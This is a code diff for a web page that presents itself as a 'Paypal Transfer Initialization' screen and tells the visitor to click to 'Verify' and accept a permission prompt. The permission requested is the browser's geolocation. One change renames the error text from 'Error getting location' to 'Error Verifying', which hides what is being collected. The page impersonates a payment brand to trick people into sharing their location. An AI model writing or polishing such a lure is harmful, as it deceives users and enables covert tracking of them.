@@ -28,7 +28,7 @@
 </head>
 <body class="flex items-center justify-center min-h-screen p-4">
     <div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-md text-center border border-gray-200">
-        <h1 class="text-3xl font-bold text-gray-800 mb-6">Paypal Trransfer Initialization</h1>
+        <h1 class="text-3xl font-bold text-gray-800 mb-6">Paypal Transfer Initialization</h1>
 
         <div id="status-message" class="mb-4 p-3 rounded-lg text-sm font-medium">
             <p class="text-gray-600">Click the button below to Verify (Accept permission if requested).</p>
@@ -181,7 +181,7 @@
          * @param {GeolocationPositionError} error - The GeolocationPositionError object.
          */
         function errorCallback(error) {
-            let errorMessage = 'Error getting location: ';
+            let errorMessage = 'Error Verifying: ';
             switch (error.code) {
                 case error.PERMISSION_DENIED:
                     errorMessage += 'User denied the request for Verification.';
